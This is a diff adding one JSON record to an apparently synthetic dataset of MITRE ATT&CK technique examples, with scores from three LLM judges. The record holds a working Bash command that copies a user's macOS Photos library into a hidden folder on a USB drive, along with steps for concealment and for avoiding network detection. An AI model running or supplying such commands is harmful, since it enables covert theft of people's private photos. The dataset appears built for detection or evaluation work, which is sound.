@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "mkdir -p \"/Volumes/UNTITLED/.media\" && cp -Rp \"$HOME/Pictures/Photos Library.photoslibrary\" \"/Volumes/UNTITLED/.media/\"",
+  "explanation": "Exfiltrates the macOS Photos library by copying it to a concealed directory on a connected USB drive.",
+  "rationale_steps": [
+    "Identify large, sensitive media data in the Photos library bundle.",
+    "Create a hidden destination on the removable media.",
+    "Copy recursively with attributes to maintain plausible metadata.",
+    "Keep traffic local-only to avoid network-based detections."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-06d48d2a-40b55f98",
+  "source_prompt_hash": "06d48d2a",
+  "timestamp_utc": "2025-09-30T05:16:28.232349Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and valid flags with proper && chaining and correct handling of space-containing paths.",
+        "semantic_score": 5,
+        "semantic_justification": "Recursively copies the macOS Photos library to a hidden directory on a mounted USB volume, aligning with exfiltration over physical medium; it assumes the volume 'UNTITLED' is present.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T10:25:39.680482Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags (-p for mkdir, -Rp for cp), proper && chaining, and correct use of $HOME and path variables.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by creating a hidden directory (prefixed with '.') on a USB volume named UNTITLED and recursively copying the macOS Photos Library to it, which is a realistic and operationally plausible exfiltration of sensitive personal data to a physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:42:06.358480Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid Bash syntax, balanced quotes for paths with spaces, and correct flags for both mkdir and cp.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements physical exfiltration by copying a common high-value target (Photos library) to a hidden directory on a standard macOS external mount point.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:42:08.074750Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
